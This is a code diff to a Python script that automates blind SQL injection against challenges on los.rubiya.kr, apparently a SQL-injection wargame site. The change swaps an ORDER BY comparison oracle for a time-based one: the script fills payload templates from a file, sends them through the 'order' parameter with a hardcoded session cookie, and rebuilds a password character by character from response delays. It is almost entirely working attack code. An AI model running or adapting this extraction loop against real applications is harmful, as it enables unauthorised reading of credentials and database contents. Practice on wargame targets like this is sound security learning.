@@ -1,33 +1,36 @@
 import string
 import requests
-url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php/"
+import time
+url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php/"
 session = requests.Session()
 char = string.printable
 header = {
-    'Cookie' : "PHPSESSID=1mg3tdj3njma0epf82af1kr1d2"
+    'Cookie' : "PHPSESSID=p9phs3kas3ep8ff1qv7q8mdo2a"
 }
-f1 = open("order-by.txt", "r")
+f1 = open("time-based.txt", "r")
 
 p = "order"
 
+f1 = open("time-based.txt", "r")
 list=[]        
 for ch in f1:                
     print(ch)
     list.append(ch)
+
 user_ch = int(input("your choose : "))
-sp1 = input("special 1 : ")
-sp2 = input("special 2 : ")
+col = input("column : ")
 len_pw = int(input("length :"))
 password = ""
 s_p = input("Sepecial params : ")
-
+sp = input("Sepecial change : ")
 for i in range(1, len_pw):
     for j in char:
-        pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", j).replace("\n", "")
-        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
-        print(get.text.find(sp1) ,get.text.find(sp2) )
-        print(len(get.text), pw[2:], get.url)
-        if get.text.find(sp1) < get.text.find(sp2):
+        start = time.time()
+        pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "").replace("{col}" , col)
+        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")            
+        timing = time.time() - start
+        print(timing)
+        if timing > 2 or sp not in get.text:
             print(len(get.text), pw[2:], get.url)
             password = password + j
             print(password)
